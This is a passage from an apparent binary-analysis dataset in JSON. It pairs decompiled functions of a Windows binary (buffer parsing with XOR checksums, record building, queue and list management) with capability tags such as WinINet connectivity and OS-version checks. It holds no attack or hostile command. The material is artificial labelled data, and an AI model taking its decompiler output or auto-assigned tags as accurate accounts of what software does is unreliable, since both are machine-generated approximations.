            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00068910(int32_t arg_8h, uint32_t arg_ch, uint32_t *arg_10h, int32_t arg_14h, uint *arg_18h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    uint32_t arg_8h_00;\n    uint32_t in_EDX;\n    uint32_t uVar3;\n    ushort extraout_var;\n    uint var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t uStack72;\n    uchar auStack71 [23];\n    uint16_t *var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint8_t *var_20h;\n    uint32_t var_1ch;\n    uint8_t var_15h;\n    int32_t var_14h;\n    uint var_10h;\n    uint8_t var_9h;\n    uint16_t *var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch < 0xc) || (0x200 < arg_ch)) {\n        uVar2 = 0;\n    }\n    else {\n        var_14h = arg_8h;\n        if (*(arg_8h + 2) < '\\0') {\n            uVar2 = 0;\n        }\n        else if ((*(arg_8h + 2) >> 3 & 0xf) == 0) {\n            iVar1 = fcn.000354c0(in_EDX & 0xffff0000 | *(arg_8h + 4));\n            if (iVar1 == 1) {\n                var_20h = var_14h + 0xc;\n                if (arg_ch == 0xc) {\n                    uVar2 = 0;\n                }\n                else {\n                    uVar3 = *var_20h;\n                    arg_8h_00 = var_14h + 0xd;\n                    var_28h = arg_ch - 0xd;\n                    if (uVar3 == 0) {\n                        uVar2 = 0;\n                    }\n                    else {\n                        var_2ch = arg_8h_00;\n                        if (((arg_18h == NULL) || (uVar3 != 10)) ||\n                           (arg_8h_00 = fcn.00037990(arg_8h_00),  arg_8h_00 == 0)) {\n                            if ((uVar3 < 8) || (0x2d < uVar3)) {\n                                uVar2 = 0;\n                            }\n                            else if (uVar3 < var_28h) {\n                                var_1ch = 0;\n                                while (var_1ch < uVar3) {\n                                    if ((((var_1ch == 8) || (var_1ch == 0xd)) ||\n                                        ((var_1ch == 0x12 || (var_1ch == 0x17)))) && (var_1ch < uVar3 - 1)) {\n                                        if (*(var_2ch + var_1ch) != '-') {\n                                            return 0;\n                                        }\n                                    }\n                                    else if (((*(var_2ch + var_1ch) < 0x30) || (0x39 < *(var_2ch + var_1ch))) &&\n                                            ((*(var_2ch + var_1ch) < 0x61 || (0x7a < *(var_2ch + var_1ch))))) {\n                                        return 0;\n                                    }\n                                    arg_8h_00 = var_1ch + 1;\n                                    var_1ch = arg_8h_00;\n                                }\n                                var_2ch = var_2ch + uVar3;\n                                var_28h = var_28h - uVar3;\n                                while (var_28h != 0) {\n                                    uVar3 = *var_2ch;\n                                    var_2ch = var_2ch + 1;\n                                    arg_8h_00 = var_28h - 1;\n                                    if (arg_8h_00 <= uVar3) {\n                                        return 0;\n                                    }\n                                    var_28h = arg_8h_00;\n                                    if (uVar3 == 0) break;\n                                    var_2ch = var_2ch + uVar3;\n                                    arg_8h_00 = arg_8h_00 - uVar3;\n                                    var_28h = arg_8h_00;\n                                }\n                                if (var_28h < 4) {\n                                    uVar2 = 0;\n                                }\n                                else {\n                                    var_8h = var_2ch;\n                                    var_24h._0_2_ = fcn.000354c0(arg_8h_00 & 0xffff0000 | *var_2ch);\n                                    var_10h._0_2_ = fcn.000354c0(CONCAT22(extraout_var, var_8h[1]));\n                                    if (var_24h == 1) {\n                                        if (var_10h == 1) {\n                                            var_4h = fcn.000686d0(var_20h + 1, *var_20h, &var_48h);\n                                            if (var_4h < 5) {\n                                                uVar2 = 0;\n                                            }\n                                            else {\n                                                var_9h = var_48h._2_1_;\n                                                for (var_1ch = 0; var_1ch < var_4h; var_1ch = var_1ch + 1) {\n                                                    *(&var_48h + var_1ch) = *(&var_48h + var_1ch) ^ var_9h >> 1;\n                                                }\n                                                var_48h = var_48h & 0xff00ffff;\n                                                var_15h = 0;\n                                                for (var_1ch = 0; var_1ch < var_4h; var_1ch = var_1ch + 1) {\n                                                    var_15h = var_15h + *(&var_48h + var_1ch);\n                                                }\n                                                if (var_9h == var_15h) {\n                                                    if ((uStack72 & 0x1f) < 0x1a) {\n                                                        *arg_10h = var_48h;\n                                                        *(arg_10h + 1) = uStack72;\n                                                        if (arg_14h != 0) {\n                                                            fcn.0007877e(arg_14h, auStack71, uStack72 & 0x1f);\n                                                        }\n                                                        if (arg_18h != NULL) {\n                                                            *arg_18h = 0;\n                                                        }\n                                                        uVar2 = 1;\n                                                    }\n                                                    else {\n                                                        uVar2 = 0;\n                                                    }\n                                                }\n                                                else {\n                                                    uVar2 = 0;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            uVar2 = 0;\n                                        }\n                                    }\n                                    else {\n                                        uVar2 = 0;\n                                    }\n                                }\n                            }\n                            else {\n                                uVar2 = 0;\n                            }\n                        }\n                        else {\n                            *arg_18h = 1;\n                            fcn.0007877e(arg_14h, var_2ch, 10);\n                            *(arg_14h + 10) = 0;\n                            uVar2 = 1;\n                        }\n                    }\n                }\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 1674
    },
    "00068ca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0xffffff88 : 0x00068cf3\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl\nfcn.00068ca0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h, uint32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t *var_81h;\n    uint var_7ch;\n    uint var_78h;\n    uint8_t uStack120;\n    uchar auStack119 [31];\n    uint8_t *var_54h;\n    uint var_50h;\n    uint8_t var_49h;\n    uint32_t var_48h;\n    uint var_44h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint8_t var_ah;\n    uint8_t var_9h;\n    uint32_t var_8h;\n    uint *var_4h;\n    \n    if (arg_14h < 0x1d) {\n        iVar3 = fcn.00068910(arg_8h, arg_ch, &var_14h, 0, 0);\n        if (iVar3 == 0) {\n            uVar2 = 0;\n        }\n        else {\n            var_78h = var_14h;\n            uStack120 = var_10h & 0x80 | arg_14h & 0x1f | (arg_18h != 0) << 5;\n    // WARNING: Ignoring partial resolution of indirect\n            var_78h._2_1_ = 0;\n            fcn.0007877e(auStack119, arg_10h, arg_14h);\n            var_8h = arg_14h + 5;\n            var_9h = 0;\n            for (var_1ch = 0; var_1ch < arg_14h + 5; var_1ch = var_1ch + 1) {\n                var_9h = var_9h + *(&var_78h + var_1ch);\n            }\n            for (var_1ch = 0; var_1ch < var_8h; var_1ch = var_1ch + 1) {\n                *(&var_78h + var_1ch) = *(&var_78h + var_1ch) ^ var_9h >> 1;\n            }\n            var_48h = fcn.000687d0(&var_78h, var_8h, &var_44h);\n            var_49h = *(arg_8h + 0xc);\n            if (var_49h == 0) {\n                uVar2 = 0;\n            }\n            else {\n                var_54h = var_49h + arg_8h + 0xd;\n                for (unique0x100001b8 = var_54h; *stack0xffffff7c != 0;\n                    unique0x00002400 = stack0xffffff7c + *stack0xffffff7c + 1) {\n                }\n                var_50h._0_2_ = (stack0xffffff7c - var_54h) + 1;\n                *NULL = stack0xffffff7c + (5 - arg_8h);\n                if (*NULL < 0x81) {\n                    fcn.0007877e(arg_1ch, arg_8h, *NULL);\n                    var_18h = arg_1ch;\n                    *(arg_1ch + 2) = *(arg_1ch + 2) | 0x80;\n                    *(arg_1ch + 3) = *(arg_1ch + 3) | 0x80;\n                    *(arg_1ch + 2) = *(arg_1ch + 2) | 4;\n                    *(arg_1ch + 3) = *(arg_1ch + 3) & 0xf0;\n                    uVar1 = fcn.000354c0(arg_1ch & 0xffff0000 | var_48h & 0xffff);\n                    *(var_18h + 6) = uVar1;\n                    *(var_18h + 8) = 0;\n                    *(var_18h + 10) = 0;\n                    var_4h = *NULL + arg_1ch;\n                    var_ah = 0xc;\n                    for (var_1ch = 0; var_1ch < var_48h; var_1ch = var_1ch + 1) {\n                        *var_4h = 0xc0;\n                        *(var_4h + 1) = var_ah;\n                        var_4h = var_4h + 2;\n                        uVar1 = fcn.000354c0(1);\n                        *var_4h = uVar1;\n                        var_4h = var_4h + 2;\n                        uVar1 = fcn.000354c0(1);\n                        *var_4h = uVar1;\n                        var_4h = var_4h + 2;\n                        uVar2 = fcn.00035490(0x3c);\n                        *var_4h = uVar2;\n                        var_4h = var_4h + 1;\n                        uVar1 = fcn.000354c0(4);\n                        *var_4h = uVar1;\n                        var_4h = var_4h + 2;\n                        *var_4h = (&var_44h)[var_1ch];\n                        uVar2 = fcn.00035490((&var_44h)[var_1ch]);\n                        *var_4h = uVar2;\n                        var_4h = var_4h + 1;\n                    }\n                    *arg_20h = var_4h - arg_1ch;\n                    uVar2 = 1;\n                }\n                else {\n                    uVar2 = 0;\n                }\n            }\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 1409
    },
    "00069050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00069050(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    if (*(arg_8h + 0xc) == 0) {\n        fcn.00076270(*(arg_8h + 0x14), arg_ch, arg_10h);\n    }\n    else {\n        (**(arg_8h + 0xc))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00069120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00069120(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_10h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = fcn.00035200(0x168);\n    if (arg_10h_00 == 0) {\n        var_10h = 0x21590004;\n    }\n    else {\n        fcn.00078790(arg_10h_00, 0, 0x168);\n        *(arg_10h_00 + 4) = 0xb1c36390;\n        *(arg_10h_00 + 8) = 0xb1c36320;\n        *(arg_10h_00 + 0xc) = 0xb1c36d60;\n        *(arg_10h_00 + 0x10) = 0xb1c36e50;\n        var_ch = 0;\n        if ((arg_18h & 1) != 0) {\n            var_ch = 2;\n        }\n        var_8h = arg_ch;\n        var_4h = 0;\n        var_10h = fcn.00075a40(arg_10h_00 + 0x14, &var_8h, 0, 0, arg_10h, arg_14h, var_ch);\n        if (var_10h == 0) {\n            uVar1 = fcn.00035360(arg_ch);\n            *(arg_10h_00 + 0x34) = uVar1;\n            if (*(arg_10h_00 + 0x34) == 0) {\n                var_10h = 0x21590004;\n            }\n            else {\n                uVar1 = fcn.00035200(arg_14h);\n                *(arg_10h_00 + 0x30) = uVar1;\n                if (*(arg_10h_00 + 0x30) == 0) {\n                    var_10h = 0x21590004;\n                }\n                else {\n                    fcn.0007877e(*(arg_10h_00 + 0x30), arg_10h, arg_14h);\n                    *(arg_10h_00 + 0x38) = arg_14h;\n                    *(arg_10h_00 + 0x3c) = var_ch;\n                    iVar2 = fcn.00033ff0(arg_10h_00 + 0x50);\n                    if (iVar2 == 0) {\n                        var_10h = fcn.00035620();\n                    }\n                    else {\n                        iVar2 = fcn.0001a8e0(arg_10h_00 + 0x48, 0xb1c374f0, arg_10h_00);\n                        if (iVar2 == 0) {\n                            fcn.000344f0(arg_10h_00 + 0x44);\n                            fcn.00036a10(arg_10h_00 + 0x1c);\n                            *arg_8h = arg_10h_00;\n                            var_10h = 0;\n                        }\n                        else {\n                            var_10h = fcn.00035620();\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if ((var_10h != 0) && (arg_10h_00 != 0)) {\n        iVar2 = fcn.00037240(arg_10h_00 + 0x50);\n        if (iVar2 != 0) {\n            fcn.00034080(arg_10h_00 + 0x50);\n        }\n        fcn.00035330(*(arg_10h_00 + 0x34));\n        fcn.00035330(*(arg_10h_00 + 0x30));\n        fcn.00075d60(arg_10h_00 + 0x14, 0);\n        fcn.00035330(arg_10h_00);\n    }\n    return var_10h;\n}\n",
        "token_count": 954
    },
    "00069320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00069320(int32_t arg_8h)\n\n{\n    uint *var_4h;\n    \n    fcn.00036ab0(arg_8h + 0x1c);\n    for (var_4h = *(arg_8h + 0x18); var_4h != NULL; var_4h = *var_4h) {\n        fcn.00075d60(var_4h + 2, 0);\n    }\n    fcn.00036b60(arg_8h + 0x1c);\n    if (*(arg_8h + 0x15c) != 0) {\n        fcn.00075d60(arg_8h + 0x160, 0);\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "00069390": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00069390(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_8h = *(arg_8h + 0x40);\n    while (var_8h != NULL) {\n        puVar1 = *var_8h;\n        fcn.00035330(var_8h);\n        var_8h = puVar1;\n    }\n    var_4h = *(arg_8h + 0x18);\n    while (var_4h != NULL) {\n        puVar1 = *var_4h;\n        fcn.00035330(var_4h);\n        var_4h = puVar1;\n    }\n    iVar2 = fcn.00037240(arg_8h + 0x48);\n    if (iVar2 != 0) {\n        fcn.000340b0(arg_8h + 0x50);\n        fcn.00037270(arg_8h + 0x48, 0);\n        fcn.00034080(arg_8h + 0x50);\n        fcn.00037220(arg_8h + 0x48);\n    }\n    fcn.00034550(arg_8h + 0x44);\n    if (*(arg_8h + 0x15c) == 0) {\n        while (*(arg_8h + 0x158) != *(arg_8h + 0x154)) {\n            uVar3 = *(arg_8h + 0x158) & 0x8000001f;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xffffffe0) + 1;\n            }\n            *(arg_8h + 0x158) = uVar3;\n            fcn.00075d60(arg_8h + 0x54 + *(arg_8h + 0x158) * 8, 0);\n            uVar3 = *(arg_8h + 0x158) + 1U & 0x8000001f;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xffffffe0) + 1;\n            }\n            *(arg_8h + 0x158) = uVar3;\n        }\n    }\n    else {\n        fcn.00075d60(arg_8h + 0x160, 0);\n    }\n    fcn.00035330(*(arg_8h + 0x34));\n    fcn.00035330(*(arg_8h + 0x30));\n    fcn.000345c0(arg_8h + 0x44);\n    fcn.00034520(arg_8h + 0x44);\n    fcn.00075d60(arg_8h + 0x14, 0);\n    fcn.00036a80(arg_8h + 0x1c);\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 715
    },
    "00069580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00069580(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, int32_t *arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_18h = fcn.0006a1a0(arg_8h, &var_4h, 0);\n    if (var_18h == 0) {\n        var_24h = 0;\n        var_20h = arg_ch;\n        var_1ch = 1;\n        fcn.00068fc0(&var_24h);\n        var_8h = 0;\n        var_ch = 0xc;\n        var_10h = &var_24h;\n        var_14h = arg_10h;\n        var_18h = fcn.00076970(var_4h, &var_14h, arg_18h, arg_1ch, arg_20h, 0);\n        if (var_18h == 0) {\n            if (*arg_1ch < 0xc) {\n                fcn.00076610(var_4h, *arg_18h);\n                *arg_18h = 0;\n                *arg_1ch = 0;\n                var_18h = 0x2159000a;\n            }\n            else {\n                puVar1 = *arg_18h;\n                var_24h = *puVar1;\n                var_20h = puVar1[1];\n                var_1ch = puVar1[2];\n                fcn.00068fc0(&var_24h);\n                if (var_1ch == '\\x02') {\n                    *arg_14h = var_20h;\n                    *arg_1ch = *arg_1ch - 0xc;\n                    if (*arg_1ch < 1) {\n                        fcn.00076610(var_4h, *arg_18h);\n                        *arg_18h = 0;\n                        *arg_1ch = 0;\n                    }\n                    else {\n                        *arg_18h = *arg_18h + 0xc;\n                        *(*arg_18h + -0xc) = var_4h;\n                    }\n                    var_18h = 0;\n                }\n                else {\n                    fcn.00076610(var_4h, *arg_18h);\n                    *arg_18h = 0;\n                    *arg_1ch = 0;\n                    var_18h = 0x2159000a;\n                }\n            }\n        }\n    }\n    fcn.0006a3f0(arg_8h, &var_4h, var_18h == 0);\n    return var_18h;\n}\n",
        "token_count": 700
    },
    "00069760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00069760(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h, uint32_t arg_18h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0;\n    var_4h = 0;\n    while ((var_4h < 5 && (var_24h = fcn.00069f20(arg_8h, &var_8h, arg_14h),  var_24h == 0))) {\n        while (var_24h = fcn.000763f0(var_8h, &var_ch, &var_10h, 0, 0),  var_24h == 0) {\n            fcn.00076610(var_8h, var_ch);\n        }\n        if (var_24h == 0x21590002) {\n            var_30h = *arg_14h;\n            var_2ch = arg_ch;\n            var_28h = (arg_18h & 1) != 0;\n            fcn.00068fc0(&var_30h);\n            var_14h = 0;\n            var_18h = 0xc;\n            var_1ch = &var_30h;\n            var_20h = arg_10h;\n            var_24h = fcn.00076840(var_8h, &var_20h, 0);\n            if (var_24h == 0) {\n                return 0;\n            }\n            fcn.0006a0d0(arg_8h, *arg_14h, 0);\n            *arg_14h = 0;\n        }\n        else {\n            fcn.0006a0d0(arg_8h, *arg_14h, 0);\n        }\n        var_4h = var_4h + 1;\n    }\n    return var_24h;\n}\n",
        "token_count": 511
    },
    "000698d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000698d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_20h = arg_ch;\n    var_18h = 3;\n    fcn.00068fc0(&var_20h);\n    var_8h = 0;\n    var_ch = 0xc;\n    var_10h = &var_20h;\n    var_14h = arg_10h;\n    var_4h = fcn.0006a060(arg_8h, arg_ch);\n    if (var_4h == 0) {\n        uVar1 = 0x21590006;\n    }\n    else {\n        uVar1 = fcn.00076840(var_4h, &var_14h, 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 257
    },
    "00069950": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00069950(uint arg_8h, int32_t arg_ch, int32_t **arg_10h, uint32_t *arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0006a060(arg_8h, arg_ch);\n    if (var_4h == 0) {\n        var_8h = 0x21590006;\n    }\n    else {\n        while (var_8h = fcn.000763f0(var_4h, arg_10h, arg_14h, arg_18h, 0),  var_8h == 0) {\n            if (*arg_14h < 0xc) {\n                fcn.00076610(var_4h, *arg_10h);\n                *arg_10h = NULL;\n                *arg_14h = 0;\n                fcn.0006a0d0(arg_8h, arg_ch, 0);\n                return 0x2159000a;\n            }\n            piVar1 = *arg_10h;\n            var_14h = *piVar1;\n            var_10h = piVar1[1];\n            var_ch = piVar1[2];\n            fcn.00068fc0(&var_14h);\n            if (var_ch != '\\x06') {\n                if ((var_14h == arg_ch) && ((var_ch == '\\x02' || (var_ch == '\\x03')))) {\n                    if (var_ch == '\\x02') {\n                        iVar2 = fcn.0006a630(arg_8h, arg_ch, *arg_10h, *arg_14h);\n                        if (iVar2 == 0) {\n                            fcn.00076610(var_4h, *arg_10h);\n                        }\n                        *arg_10h = NULL;\n                        *arg_14h = 0;\n                        return 0x21590006;\n                    }\n                    *arg_14h = *arg_14h - 0xc;\n                    if (*arg_14h < 1) {\n                        fcn.00076610(var_4h, *arg_10h);\n                        *arg_10h = NULL;\n                        *arg_14h = 0;\n                    }\n                    else {\n                        *arg_10h = *arg_10h + 3;\n                        (*arg_10h)[-3] = var_4h;\n                    }\n                    return 0;\n                }\n                fcn.00076610(var_4h, *arg_10h);\n                *arg_10h = NULL;\n                *arg_14h = 0;\n                fcn.0006a0d0(arg_8h, arg_ch, 0);\n                return 0x2159000a;\n            }\n            fcn.00076610(var_4h, *arg_10h);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 714
    },
    "00069b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00069b20(uint arg_8h, int32_t arg_ch, int32_t *arg_10h, int32_t **arg_14h, uint32_t *arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    *arg_14h = NULL;\n    *arg_18h = 0;\n    iVar2 = fcn.0006a6b0(arg_8h, arg_ch, arg_14h, arg_18h, &var_4h);\n    if (iVar2 == 0) {\n        var_4h = fcn.0006a060(arg_8h, arg_ch);\n        if (var_4h == 0) {\n            return 0x21590006;\n        }\n        while (var_8h = fcn.000763f0(var_4h, arg_14h, arg_18h, arg_1ch, 0),  var_8h == 0) {\n            if (*arg_18h < 0xc) {\n                var_8h = 0x2159000a;\n                break;\n            }\n            piVar1 = *arg_14h;\n            var_14h = *piVar1;\n            var_10h = piVar1[1];\n            var_ch = piVar1[2];\n            fcn.00068fc0(&var_14h);\n            if (var_ch == '\\x06') {\n                fcn.00076610(var_4h, *arg_14h);\n            }\n            else {\n                if ((var_ch == '\\x02') && (var_14h == arg_ch)) goto code_r0x00069c55;\n                if ((var_ch != '\\x03') || (var_14h != arg_ch)) {\n                    var_8h = 0x2159000a;\n                    break;\n                }\n                fcn.00076610(var_4h, *arg_14h);\n            }\n        }\n    }\n    else {\n        piVar1 = *arg_14h;\n        var_14h = *piVar1;\n        var_10h = piVar1[1];\n        var_ch = piVar1[2];\n        fcn.00068fc0(&var_14h);\ncode_r0x00069c55:\n        *arg_10h = var_10h;\n        *arg_18h = *arg_18h - 0xc;\n        if (*arg_18h < 1) {\n            fcn.00076610(var_4h, *arg_14h);\n            *arg_14h = NULL;\n            *arg_18h = 0;\n        }\n        else {\n            *arg_14h = *arg_14h + 3;\n            (*arg_14h)[-3] = var_4h;\n        }\n        var_8h = 0;\n    }\n    if ((var_8h != 0) && (*arg_14h != NULL)) {\n        fcn.00076610(var_4h, *arg_14h);\n        *arg_14h = NULL;\n        *arg_18h = 0;\n    }\n    fcn.0006a0d0(arg_8h, arg_ch, var_8h == 0);\n    return var_8h;\n}\n",
        "token_count": 812
    },
    "00069d30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00069d30(uint noname_0, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    if (arg_ch != 0) {\n        fcn.00076610(*(arg_ch + -0xc), arg_ch + -0xc);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "00069d60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00069d60(int32_t arg_8h, char *arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint var_20h;\n    uint var_18h;\n    char *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        uVar2 = 0;\n    }\n    else {\n        var_4h = arg_ch;\n        while (*var_4h != '\\0') {\n            var_14h = var_4h;\n            do {\n                cVar1 = *var_14h;\n                var_14h = var_14h + 1;\n                var_4h = var_14h;\n            } while (cVar1 != '\\0');\n        }\n        puVar3 = fcn.00035200(var_4h + (0x15 - arg_ch));\n        if (puVar3 == NULL) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            fcn.0007877e(puVar3 + 5, arg_ch, var_4h + (1 - arg_ch));\n            puVar3[1] = 0;\n            puVar3[4] = arg_10h;\n            fcn.00034550(arg_8h + 0x44);\n            *puVar3 = *(arg_8h + 0x40);\n            *(arg_8h + 0x40) = puVar3;\n            fcn.000345c0(arg_8h + 0x44);\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 399
    },
    "00069e50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00069e50(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        uVar1 = 0;\n    }\n    else if ((arg_ch == 0xf) && (arg_14h == 0xc)) {\n        uVar1 = fcn.0006bbf0(arg_8h, arg_10h);\n    }\n    else {\n        puVar2 = fcn.00035200(arg_14h + 0x14);\n        if (puVar2 == NULL) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            fcn.0007877e(puVar2 + 5, arg_10h, arg_14h);\n            puVar2[1] = 1;\n            puVar2[2] = arg_ch;\n            puVar2[3] = arg_14h;\n            puVar2[4] = arg_18h;\n            fcn.00034550(arg_8h + 0x44);\n            *puVar2 = *(arg_8h + 0x40);\n            *(arg_8h + 0x40) = puVar2;\n            fcn.000345c0(arg_8h + 0x44);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 359
    },
    "00069f20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
